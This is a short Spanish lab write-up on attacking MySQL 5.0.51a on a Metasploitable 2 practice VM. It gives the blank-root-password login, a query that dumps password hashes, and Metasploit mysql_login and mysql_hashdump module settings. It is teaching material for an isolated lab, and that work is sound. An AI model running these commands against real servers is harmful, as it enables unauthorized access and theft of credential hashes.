# MySQL 5.0.51a (puerto 3306) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** servidor de base de datos **MySQL 5.0.51a**, **puerto 3306**.

**Cómo se explota:** el usuario `root` tiene **contraseña vacía**. Con acceso de root a la base de datos puedes leer todas las bases, volcar hashes de usuarios y, con el privilegio `FILE`, leer/escribir archivos del sistema.

## Explotación manual (sin Metasploit)

```bash
# Conexión como root con contraseña vacía
mysql -h 192.168.100.9 -u root

# Una vez dentro:
show databases;
select user, password from mysql.user;   # hashes de MySQL
```

## Explotación con Metasploit

```bash
use auxiliary/scanner/mysql/mysql_login     # prueba credenciales
set RHOSTS 192.168.100.9
run

use auxiliary/scanner/mysql/mysql_hashdump  # vuelca los hashes
set RHOSTS 192.168.100.9
set USERNAME root
run
```
